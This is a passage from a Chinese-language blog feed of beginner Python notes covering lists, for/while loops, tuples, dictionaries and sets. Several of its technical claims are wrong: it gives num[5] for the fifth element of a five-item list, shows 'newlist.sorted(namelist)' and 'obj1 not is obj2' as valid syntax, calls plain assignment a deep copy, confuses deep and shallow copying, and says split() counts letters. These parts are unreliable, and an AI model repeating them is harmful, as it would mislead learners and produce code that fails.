<h4 id="列表个数len"><a href="#列表个数len" class="headerlink" title="列表个数len"></a>列表个数len</h4><p>len( )函数可以获得列表的元素个数。</p>
<h4 id="列表相加"><a href="#列表相加" class="headerlink" title="列表相加"></a>列表相加</h4><p>Python是允许列表相加的，相当于将列表结合。</p>
<p>如果将列表以一个数字，这个数字相当于是列表元素重复次数。</p>
<h4 id="删除列表元素"><a href="#删除列表元素" class="headerlink" title="删除列表元素"></a>删除列表元素</h4><p>删除指定索引的列表元素：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">del name_list[i]  #删除索引i的列表元素</span><br></pre></td></tr></table></figure>
<p>删除列表区间元素：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">del name_list[start:end] #删除从索引start到end-1索引的列表元素</span><br></pre></td></tr></table></figure>
<p>用step作为每隔多少区间再删除:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">del name_list[start:end:step]  #每隔step步，删除所有start到end-1</span><br></pre></td></tr></table></figure>
<p>建立一个空列表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name_list&#x3D;[]</span><br></pre></td></tr></table></figure>
<h4 id="删除列表"><a href="#删除列表" class="headerlink" title="删除列表"></a>删除列表</h4><p>Python允许我们删除整个列表，列表一经删除后就无法复原，同时也无法做任何操作了，删除列表的方式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">del name_list #删除列表name_list</span><br></pre></td></tr></table></figure>
<h4 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h4><p>在面向对象的程序设计(Object Oriented Programming)观念里，所有数据皆算是一个对象(Object)，例如，整数、浮点数、字符串或是本章所提的列表皆是一个对象。可以为所建立的对象设计一些方法(method)，供这些对象使用，在这里所提的方法就是函数。</p>
<p>Python有为一些基本对象提供默认的方法，要使用这些方法可以在对象后先放小数点，再放方法名称，基本语法格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对象.方法()</span><br></pre></td></tr></table></figure>
<p>字符串操作常用的方法(method)如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lower( )：将字符串转成小写</span><br><span class="line"></span><br><span class="line">upper( )：将字符串转成大写</span><br><span class="line"></span><br><span class="line">title( )：将字符串转成第一个字母大写，其他是小写</span><br><span class="line"></span><br><span class="line">rstrip( )：删除字符串尾端多余的空白</span><br><span class="line"></span><br><span class="line">lstrip( )：删除字符串开始端多余的空白</span><br><span class="line"></span><br><span class="line">strip( )：删除字符串头尾两边多余的空白</span><br></pre></td></tr></table></figure>
<h4 id="增加与删除列表元素"><a href="#增加与删除列表元素" class="headerlink" title="增加与删除列表元素"></a>增加与删除列表元素</h4><p>在列表末端增加元素append( )：</p>
<p>Python为列表内置了新增元素的方法append( )，这个方法，可以在列表末端直接增加元素。方法为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namelist.append(&#39;新增元素&#39;)</span><br></pre></td></tr></table></figure>
<p>插入列表元素insert( )：</p>
<p>append( )方法是固定在列表末端插入元素，insert( )方法则是可以在任意位置插入元素，它的使用格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert(索引，元素内容) #索引是插入位置，元素内容是插入内容</span><br></pre></td></tr></table></figure>
<p>删除列表元素pop():</p>
<p>pop( )方法删除元素最大的优点是，删除后将弹出所删除的值，使用pop( )时若是未指明所删除元素的位置，一律删除列表末端的元素。pop( )的使用方式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">value&#x3D;namelist.pop()  #没有索引是删除列表末端的元素</span><br><span class="line">value&#x3D;namelist.pop(i)  #删除指定索引值的列表元素</span><br></pre></td></tr></table></figure>
<p>删除指定元素remove():</p>
<p>在删除列表元素时，有时可能不知道元素在列表内的位置，此时可以使用remove()方法删除指定的元素，它的使用方式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namelist.remove(想删除的元素内容)</span><br></pre></td></tr></table></figure>
<h4 id="列表的排序"><a href="#列表的排序" class="headerlink" title="列表的排序"></a>列表的排序</h4><p>颠倒排序reverse( )：</p>
<p>reverse( )可以颠倒排序列表元素，它的使用方式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namelist.reverse()  #颠倒namlist中的列表元素</span><br></pre></td></tr></table></figure>
<p>列表经颠倒排放后，就算永久性更改了，如果要复原，可以再执行一次reverse( )方法。</p>
<p>sort( )排序：</p>
<p>sort( )方法可以对列表元素由小到大排序，这个方法同时对纯数值元素与纯英文字符串元素有非常好的效果。需要注意的是，经排序后原列表的元素顺序会被永久更改。它的使用格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namelist.sort()</span><br></pre></td></tr></table></figure>
<p>sorted( )排序:</p>
<p>如果不希望更改列表元素顺序，可以使用另一种排序sorted( )，使用这个排序可以获得想要的排序结果，我们可以用新列表存储新的排序列表，同时原先列表的顺序将不更改。它的使用格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">newlist.sorted(namelist)</span><br></pre></td></tr></table></figure>
<h4 id="列表操作index"><a href="#列表操作index" class="headerlink" title="列表操作index"></a>列表操作index</h4><p>index可以返回特定元素内容第一次出现的索引值，它的使用格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">索引值&#x3D;列表名称.index(搜寻值)</span><br></pre></td></tr></table></figure>
<h4 id="列表操作count"><a href="#列表操作count" class="headerlink" title="列表操作count"></a>列表操作count</h4><p>可以返回特定元素内容出现的次数，它的使用格式为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">次数&#x3D;列表名称.count(搜寻值)</span><br></pre></td></tr></table></figure>
<h4 id="列表操作join"><a href="#列表操作join" class="headerlink" title="列表操作join"></a>列表操作join</h4><p>这个方法可以将列表的元素组成一个字符串，它的使用格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">char.join(seq)</span><br></pre></td></tr></table></figure>
<p>seq表示参数必须为列表、元组等序列数据，char则是组合后各元素间的分隔字符，可以是单一字符，也可以是字符串。</p>
<h4 id="列表内含列表"><a href="#列表内含列表" class="headerlink" title="列表内含列表"></a>列表内含列表</h4><p>列表内含列表的基本格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">num&#x3D;[1,2,3,4,[7,8,9]]</span><br></pre></td></tr></table></figure>
<p>num是一个列表，在这个列表内有另一个列表[7, 8, 9]，因为内部列表的索引值是5，所以可以用num[5]，获得这个元素列表的内容.</p>
<p><img src="/2020/09/25/Python-%E5%9F%BA%E7%A1%803/image-20201002150307424.png" alt="image-20201002150307424"></p>
<p>想要存取列表内的列表元素，可以使用下列格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">num[索引1][索引2]</span><br></pre></td></tr></table></figure>
<p>索引1是元素列表原先索引位置，索引2是元素列表内部的索引。</p>
<h4 id="列表的深复制"><a href="#列表的深复制" class="headerlink" title="列表的深复制"></a>列表的深复制</h4><p>只要有一个列表更改元素会影响到另一个列表同步更改的复制称深复制(deep copy)。</p>
<p>假设我喜欢的运动是，篮球与棒球，可以用下列方式设定列表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysports&#x3D;[&#39;football&#39;，‘baseetball’]</span><br></pre></td></tr></table></figure>
<p>如果我的朋友也喜欢这2种运动，可以下列方式设定列表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">friedsports&#x3D;mysports</span><br></pre></td></tr></table></figure>
<h4 id="列表的浅复制-shallow-copy"><a href="#列表的浅复制-shallow-copy" class="headerlink" title="列表的浅复制-shallow copy"></a>列表的浅复制-shallow copy</h4><p>浅复制(shallow copy)观念是，执行复制后当一个列表改变后，不会影响另一个列表的内容。方法如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frinedsports&#x3D;mysports[:]</span><br></pre></td></tr></table></figure>
<h4 id="split-处理字符串"><a href="#split-处理字符串" class="headerlink" title="split( )处理字符串"></a>split( )处理字符串</h4><p>这个方法(method)，可以将字符串以空格为分隔符，将字符串拆开，变成一个列表。变成列表后我们可以使用len( )获得此列表的元素个数，这相当于可以计算字符串是由多少个英文字母组成，由于中文字之间没有空格，该方法只适用在纯英文文件。</p>
<h4 id="in和not-in"><a href="#in和not-in" class="headerlink" title="in和not in"></a>in和not in</h4><p>主要是用于判断一个对象是否属于另一个对象，对象可以是字符串(string)、列表(list)、元组(Tuple)。语法格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">boolan&#x3D;obj1 in obj2 # obj1在obj2内会传回True</span><br><span class="line">boolan&#x3D;obj1 not in obj2 # obj1不在obj2内会传回True</span><br></pre></td></tr></table></figure>
<h4 id="is和not-is"><a href="#is和not-is" class="headerlink" title="is和not is"></a>is和not is</h4><p>用于比较两个对象是否相同，在此所谓相同并不只是内容相同，而是指对象变量指向相同的内存，对象可以是变量、字符串、列表、元组(Tuple)。语法格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">boolan&#x3D;obj1 is obj2 # obj1等于obj2会传回True</span><br><span class="line">boolan&#x3D;obj1 not is obj2 # obj1不等于obj2会传回True</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-基础4</title>
    <url>/2020/10/02/Python-%E5%9F%BA%E7%A1%804/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h2 id="循环设计"><a href="#循环设计" class="headerlink" title="循环设计"></a>循环设计</h2><h4 id="基本for循环"><a href="#基本for循环" class="headerlink" title="基本for循环"></a>基本for循环</h4><p>for循环可以让程序将整个对象内的元素遍历(也可以称迭代)，在遍历期间，同时可以纪录或输出每次遍历的状态或称轨迹。for循环基本语法格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for var in 可迭代对象：</span><br><span class="line">    程序代码</span><br><span class="line">#将可迭代对象的元素当作var，重复执行，直到每个元素皆被执行一次，整个循环才会停止。</span><br></pre></td></tr></table></figure>
<p>可迭代对象(iterable object)可以是列表、元组、字典与集合或range( )，</p>
<p>如列出球员名称：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002152630616.png" alt="image-20201002152630616"></p>
<p>执行结果：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002152709207.png" alt="image-20201002152709207"></p>
<p>循环的流程示意图：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002152754322.png" alt="image-20201002152754322"></p>
<h4 id="for循环应用在列表"><a href="#for循环应用在列表" class="headerlink" title="for循环应用在列表"></a>for循环应用在列表</h4><p>Python也允许将for循环应用在截取区间列表元素上。</p>
<p>如列出列表前3和后三球员的名称：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002153012619.png" alt="image-20201002153012619"></p>
<p>tip：升幂是指由小到大排列。降幂是指由大到小排列。</p>
<h4 id="for循环应用在数据类别的判断"><a href="#for循环应用在数据类别的判断" class="headerlink" title="for循环应用在数据类别的判断"></a>for循环应用在数据类别的判断</h4><p>如有一个files列表内含一系列文件名，请将“.py”的Python程序另外建立到py列表，然后打印。</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002153355995.png" alt="image-20201002153355995"></p>
<h4 id="for循环删除列表内所有元素"><a href="#for循环删除列表内所有元素" class="headerlink" title="for循环删除列表内所有元素"></a>for循环删除列表内所有元素</h4><p>Python没有提供删除整个列表元素的方法，不过我们可以使用for循环完成此工作。</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002153514307.png" alt="image-20201002153514307"></p>
<h4 id="range-函数"><a href="#range-函数" class="headerlink" title="range()函数"></a>range()函数</h4><p>Python可以使用range( )函数产生一个等差序列，称这等差序列为可迭代对象(iterable object)，也可以称是range对象。由于range( )是产生等差序列，可以将此等差序列当作循环的计数器。</p>
<p>range的用法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">range(start,stop,step)</span><br></pre></td></tr></table></figure>
<p>stop是唯一必须的值，等差序列是产生stop的前一个值。</p>
<p>当range(n)函数搭配一个参数时：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">range(n) # 将产生0，1，...，n-1的可迭代对象内容</span><br></pre></td></tr></table></figure>
<h4 id="嵌套for循环"><a href="#嵌套for循环" class="headerlink" title="嵌套for循环"></a>嵌套for循环</h4><p>如果外循环要执行n次，内循环要执行m次，则整个循环执行的次数是n*m次，设计这类循环时要特别注意：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">外层循环的索引值与内层循环的索引值必须不同</span><br><span class="line">程序代码的内缩一定要小心</span><br></pre></td></tr></table></figure>
<p>嵌套循环基本语法:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for 变量 in 对象：</span><br><span class="line">    ....</span><br><span class="line">    for 变量 in 对象：</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>
<p>如打印9*9乘法表</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002154711352.png" alt="image-20201002154711352"></p>
<p>执行结果：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002154746535.png" alt="image-20201002154746535"></p>
<h4 id="结束循环break"><a href="#结束循环break" class="headerlink" title="结束循环break"></a>结束循环break</h4><p>某些条件发生时可以离开循环，可以在循环内执行break指令，即可立即离开循环，这个指令通常是和if语句配合使用。下列是常用的语法格式：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002154918808.png" alt="image-20201002154918808"></p>
<p>流程图如下：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002154955490.png" alt="image-20201002154955490"></p>
<h4 id="循环暂时停止continue"><a href="#循环暂时停止continue" class="headerlink" title="循环暂时停止continue"></a>循环暂时停止continue</h4><p>某些条件发生时可以不往下执行循环内容，此时可以用continue指令，这个指令通常是和if语句配合使用。下列是常用的语法格式：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002155121884.png" alt="image-20201002155121884"></p>
<p>流程图如下：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002155156087.png" alt="image-20201002155156087"></p>
<h4 id="for-else循环"><a href="#for-else循环" class="headerlink" title="for else循环"></a>for else循环</h4><p>如果期待所有的if叙述条件是False时，在最后一次循环后，可以执行特定程序区块指令，这个指令通常是和if和break语句配合使用。下列是常用的语法格式：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002155330311.png" alt="image-20201002155330311"></p>
<p> 流程图如下：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002155405810.png" alt="image-20201002155405810"></p>
<p>如数学中测试某一个数字n是否是质数，质数的条件是：</p>
<p>2是质数，n不可被2至n-1的数字整除。</p>
<p>如果所输入的数字是质数则列出是质数，否则列出不是质数。</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002155555414.png" alt="image-20201002155555414"></p>
<h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4><p>一直执行直到条件运算为False才会离开循环，所以设计while循环时一定要设计一个条件可以离开循环，相当于让循环结束。程序设计时，如果忘了设计条件可以离开循环，程序造成无限循环状态。</p>
<p>语法格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while 条件运算：</span><br><span class="line">   程序区块</span><br></pre></td></tr></table></figure>
<p>while语法流程图：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002155746278.png" alt="image-20201002155746278"></p>
<p>如猜数字游戏，程序用变量answer存储欲猜的数字，程序执行时用变量guess存储所猜的数字：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002155850070.png" alt="image-20201002155850070"></p>
<h4 id="pass"><a href="#pass" class="headerlink" title="pass"></a>pass</h4><p>pass指令是什么事也不做，如果想要建立一个无限循环可以使用下列写法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while True:</span><br><span class="line">   pass</span><br></pre></td></tr></table></figure>
<h2 id="元组Tuple"><a href="#元组Tuple" class="headerlink" title="元组Tuple"></a>元组Tuple</h2><p>Python提供一种数据类型称元组(tuple)，这种数据类型结构与列表完全相同，但是它与列表最大的差异是，它的元素值与元素个数不可更改。</p>
<h4 id="元组的定义"><a href="#元组的定义" class="headerlink" title="元组的定义"></a>元组的定义</h4><p>列表在定义时是将元素放在中括号内，元组的定义则是将元素放在小括号“( )”内，元组的语法格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tuple_1 &#x3D; (元素1，元素2....)</span><br><span class="line"></span><br><span class="line">tuple2&#x3D;(元素1，) #只有一个元素的元组</span><br></pre></td></tr></table></figure>
<p>元组的每一个数据称元素，元素可以是整数、字符串或列表等，这些元素放在小括号( )内，彼此用逗号“,”隔开。如果要打印元组内容，可以用print( )函数，将元组名称当作变量名称即可。</p>
<h4 id="读取元组数据"><a href="#读取元组数据" class="headerlink" title="读取元组数据"></a>读取元组数据</h4><p>定义元组时是使用小括号“( )”，如果想要读取元组内容，和列表是一样的，用中括号“[ ]”。在Python中元组元素是从索引值0开始配置。所以如果是元组的第一个元素，索引值是0，第二个元素索引值是1。</p>
<p>语法格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tuple1[i] #读取索引i的元组元素</span><br></pre></td></tr></table></figure>
<h4 id="遍历元组数据"><a href="#遍历元组数据" class="headerlink" title="遍历元组数据"></a>遍历元组数据</h4><p>在Python可以使用for循环遍历所有元组元素。</p>
<p>如假设元组是由字符串和数值组成的密码：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002163223009.png" alt="image-20201002163223009"></p>
<h4 id="重新定义元组"><a href="#重新定义元组" class="headerlink" title="重新定义元组"></a>重新定义元组</h4><p>如果想要修改元组元素，可以使用重新定义元组方式处理。</p>
<p>如用重新定义方式修改元组元素内容：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002163611561.png" alt="image-20201002163611561"></p>
<h4 id="元组切片"><a href="#元组切片" class="headerlink" title="元组切片"></a>元组切片</h4><p>元组切片观念与列表切片观念相同。</p>
<p>元组切片的应用：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002163846961.png" alt="image-20201002163846961"></p>
<h4 id="方法与函数"><a href="#方法与函数" class="headerlink" title="方法与函数"></a>方法与函数</h4><p>应用在列表上的方法或函数如果不会更改元组内容，则可以将它应用在元组，如len( )。如果会更改元组内容，则不可以将它应用在元组，如append( )、insert( )或pop( )。</p>
<p>如列出元组元素长度（个数）:</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002164045777.png" alt="image-20201002164045777"></p>
<h4 id="列表与元组数据互换"><a href="#列表与元组数据互换" class="headerlink" title="列表与元组数据互换"></a>列表与元组数据互换</h4><p>有需要将列表(list)与元组(tuple)数据类型互换，可以使用下列指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">list():将元组数据类型改为列表</span><br><span class="line"></span><br><span class="line">tuple():将列表数据类型改为元组</span><br></pre></td></tr></table></figure>
<p>获取最大值、最小值：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002164525223.png" alt="image-20201002164525223"></p>
<h4 id="zip函数"><a href="#zip函数" class="headerlink" title="zip函数"></a>zip函数</h4><p>这是一个内置函数，参数内容主要是可迭代(iterable)的对象，如列表等。然后将相对应的元素打包成元组(tuple)，最后传给zip对象，可以使用list( )函数将zip对象转成列表。</p>
<p>zip的应用：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002164842327.png" alt="image-20201002164842327"></p>
<p>执行结果：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002164912719.png" alt="image-20201002164912719"></p>
<p>如果在zip( )函数内增加“*”符号，相当于可以unzip( )列表。</p>
<p>如恢复zip前的列表：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002165030151.png" alt="image-20201002165030151"></p>
<p>执行结果：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002165054580.png" alt="image-20201002165054580"></p>
<h4 id="元组的优点"><a href="#元组的优点" class="headerlink" title="元组的优点"></a>元组的优点</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以更安全的保护数据。</span><br><span class="line">加快程序的执行速度，元组(tuple)结构比列表(list)简单，占用较少的系统资源，程序执行时速度比较快。</span><br></pre></td></tr></table></figure>
<h2 id="字典Dict"><a href="#字典Dict" class="headerlink" title="字典Dict"></a>字典Dict</h2><p>列表(list)与元组(tuple)是依序排列是序列数据结构，只要知道元素的特定位置，即可使用索引观念取得元素内容。字典并不是依序排列的数据结构，通常可称是非序列数据结构，所以无法使用类似列表的数值(0, 1, … n)索引观念取得元素内容。</p>
<h4 id="定义字典"><a href="#定义字典" class="headerlink" title="定义字典"></a>定义字典</h4><p>字典也是一个列表型的数据结构，但是它的元素是用“键-值”方式配对存储，在操作时是用键(key)取得值(value)的内容。定义字典时，是将键-值放在大括号“{}”内，字典的语法格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dict_1 &#x3D; &#123;键1:值1,.....,键n:值n&#125;</span><br></pre></td></tr></table></figure>
<p>字典的值(value)可以是任何Python的对象，可以是数值、字符串、列表等</p>
<h4 id="列出字典元素的值"><a href="#列出字典元素的值" class="headerlink" title="列出字典元素的值"></a>列出字典元素的值</h4><p>字典的元素是“键-值”配对设定，如果想要取得元素的值，可以将键当作是索引方式处理，因此字典内的元素不可有重复的键。</p>
<p>传回键值的语法格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fruits[&#39;水蜜桃&#39;]  #用字典变量[&#39;键&#39;]取得值</span><br></pre></td></tr></table></figure>
<h4 id="增加字典元素"><a href="#增加字典元素" class="headerlink" title="增加字典元素"></a>增加字典元素</h4><p>可使用下列语法格式增加字典元素：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dict_1 [键] &#x3D; 值 #dict_1为字典变量</span><br></pre></td></tr></table></figure>
<p>如为fruits字典增加橘子一斤18元：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002170216824.png" alt="image-20201002170216824"></p>
<h4 id="删除字典特定元素"><a href="#删除字典特定元素" class="headerlink" title="删除字典特定元素"></a>删除字典特定元素</h4><p>删除字典的特定元素的语法格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">del  dict_1[键] #删除特定键的元素</span><br></pre></td></tr></table></figure>
<h4 id="删除所有字典元素"><a href="#删除所有字典元素" class="headerlink" title="删除所有字典元素"></a>删除所有字典元素</h4><p>Python有提供方法clear( )可以将字典的所有元素删除，此时字典仍然存在，不过将变成空的字典。</p>
<p>如删除fruits字典的所有元素：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002170528529.png" alt="image-20201002170528529"></p>
<p>Python也有提供del指令可以将整个字典删除，字典一经删除就不再存在。它的语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">del dict_1</span><br></pre></td></tr></table></figure>
<p>在程序设计时，也允许先建立一个空字典，建立空字典的语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dict_2 &#x3D;&#123;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="字典的复制"><a href="#字典的复制" class="headerlink" title="字典的复制"></a>字典的复制</h4><p>为了要保护原先字典内容，常会需要将字典复制，语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new_dict &#x3D; dict_1.copy()</span><br></pre></td></tr></table></figure>
<p>上述所复制的字典是独立存在新地址的字典。</p>
<h4 id="取得字典元素的数量"><a href="#取得字典元素的数量" class="headerlink" title="取得字典元素的数量"></a>取得字典元素的数量</h4><p>在列表(list)或元组(tuple)使用的方法len( )也可以应用在字典，它的语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">length&#x3D; len(dict_1)</span><br></pre></td></tr></table></figure>
<p>可以用下列语法验证元素是否存在：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">键 in dict_1 #验证键元素是否存在</span><br></pre></td></tr></table></figure>
<h4 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h4><p>1.遍历字典的键-值</p>
<p>Python有提供方法items( )，可以让我们取得字典键-值配对的元素：</p>
<p>如使用for循环加items()方法</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002171650626.png" alt="image-20201002171650626"></p>
<p>2.遍历字典的键</p>
<p>不想要取得字典的值(value)，只想要键(keys)，Python有提供方法keys( )，可以取得字典的键内容。</p>
<p>3.遍历字典的值</p>
<p>Python有提供方法values( )，可以取得字典值列表。</p>
<p>如使用for循环加上values( )方法取得字典的值：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002172037258.png" alt="image-20201002172037258"></p>
<p>在字典的应用中键不可有重复，值是可以重复。</p>
<h4 id="字典内含列表元素"><a href="#字典内含列表元素" class="headerlink" title="字典内含列表元素"></a>字典内含列表元素</h4><p>在Python的应用中也允许将列表放在字典内，这时列表将是字典某键的值。如果想要遍历这类数据结构，需要使用嵌套循环和字典的方法items( )，外层循环是取得字典的键，内层循环则是将含列表的值拆解。</p>
<p>如定义内含字符串的字典，然后再拆解打印：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002172510824.png" alt="image-20201002172510824"></p>
<h4 id="字典常用函数和方法"><a href="#字典常用函数和方法" class="headerlink" title="字典常用函数和方法"></a>字典常用函数和方法</h4><p>len():可以列出字典元素的个数。</p>
<p>get():搜寻字典的键，如果键存在则传回该键的值，如果不存在则传回默认值，ret_value = dict.get(key),default=none。</p>
<p>fromkeys():建立字典的一个方法。</p>
<p>setdefault()方法基本上与get( )相同，不同之处在于get( )方法不会改变字典内容。使用setdefault( )方法时若所搜寻的键不在，会将键-值加入字典，如果有设定默认值则将键:默认值加入字典，如果没有设定默认值则将键:None加入字典。</p>
<p>pop(): 这个方法可以删除字典元素，它的语法格式如下：</p>
<p>ret.value = dict.pop(key)</p>
<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>集合的基本观念是无序且每个元素是唯一的，集合元素的内容是不可变的(immutable)，常见的元素有整数(intger)、浮点数(float)、字符串(string)、元组(tuple)等。至于可变(mutable)内容列表(list)、字典(dict)、集合(set)等不可以是集合元素。</p>
<h4 id="建立集合"><a href="#建立集合" class="headerlink" title="建立集合"></a>建立集合</h4><p>Python可以使用大括号“{ }”或set( )函数建立集合。</p>
<p>Python允许我们直接使用大括号“{ }”设定集合，如：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002174052833.png" alt="image-20201002174052833"></p>
<p>集合的特色是元素是唯一的，所以如果设定集合时有重复元素情形，多的部分将被舍去。</p>
<p>可以使用内置的set( )函数建立集合，set( )函数参数的内容可以是字符串(string)、列表(list)、元组(tuple)等。这时原先字符串(string)、列表(list)、元组(tuple)的元素将被转成集合元素。</p>
<p>如使用set( )函数建立空集合：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002174250783.png" alt="image-20201002174250783"></p>
<h4 id="大数据与集合的应用"><a href="#大数据与集合的应用" class="headerlink" title="大数据与集合的应用"></a>大数据与集合的应用</h4><p>在海量数据中将重复的数据删除，只要将列表数据使用set( )函数转为集合数据，再使用list( )函数将集合数据转为列表数据就可以了。</p>
<p>如将列表内重复性的数据删除：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002174548719.png" alt="image-20201002174548719"></p>
<p>执行结果：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002174628978.png" alt="image-20201002174628978"></p>
<h4 id="集合的操作"><a href="#集合的操作" class="headerlink" title="集合的操作"></a>集合的操作</h4><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002174706619.png" alt="image-20201002174706619"></p>
<h4 id="交集"><a href="#交集" class="headerlink" title="交集"></a>交集</h4><p>在Python语言的交集符号是“&amp;”，另外，也可以使用intersection( )方法完成这个工作。</p>
<p>如有数学与物理2个夏令营，这个程序会列出同时参加这2个夏令营的成员：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002174821819.png" alt="image-20201002174821819"></p>
<h4 id="并集"><a href="#并集" class="headerlink" title="并集"></a>并集</h4><p>在Python语言的并集符号是“|”，另外，也可以使用union( )方法完成这个工作。</p>
<p>如有数学与物理2个夏令营，这个程序会列出参加这2个夏令营的所有成员：</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002174939938.png" alt="image-20201002174939938"></p>
<h4 id="差集"><a href="#差集" class="headerlink" title="差集"></a>差集</h4><p>有A和B两个集合，如果想获得属于A集合元素，同时不属于B集合则可以使用差集(A-B)。如果想获得属于B集合元素，同时不属于A集合则可以使用差集(B-A)。</p>
<p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002175319303.png" alt="image-20201002175319303"></p>
